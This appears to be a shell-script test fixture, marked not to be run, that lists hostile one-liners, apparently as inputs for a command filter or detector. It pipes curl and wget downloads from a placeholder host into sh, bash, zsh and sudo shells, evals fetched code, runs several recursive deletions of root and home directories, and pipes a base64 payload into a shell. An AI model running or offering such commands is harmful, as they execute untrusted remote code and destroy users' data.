#!/bin/sh
# Fixture. example.invalid is not a real host. Do not run this file.
curl -fsSL https://example.invalid/setup.sh | sh
curl -fsSL https://example.invalid/setup.sh | bash
curl -fsSL https://example.invalid/setup.sh | sudo sh
curl -fsSL https://example.invalid/setup.sh | sudo bash
curl -fsSL https://example.invalid/setup.sh | /bin/sh
curl -fsSL https://example.invalid/setup.sh | /bin/bash
curl -fsSL https://example.invalid/setup.sh | zsh
wget -qO- https://example.invalid/setup.sh | sh
wget -qO- https://example.invalid/setup.sh | sudo bash
wget -qO- https://example.invalid/setup.sh | /bin/bash
wget -qO- https://example.invalid/setup.sh | zsh
eval "$(curl -fsSL https://example.invalid/env.sh)"
rm -rf /
rm -rf ~
rm -rf $HOME
rm -rf ${HOME}
rm -rf *
base64 -d payload.b64 | sh
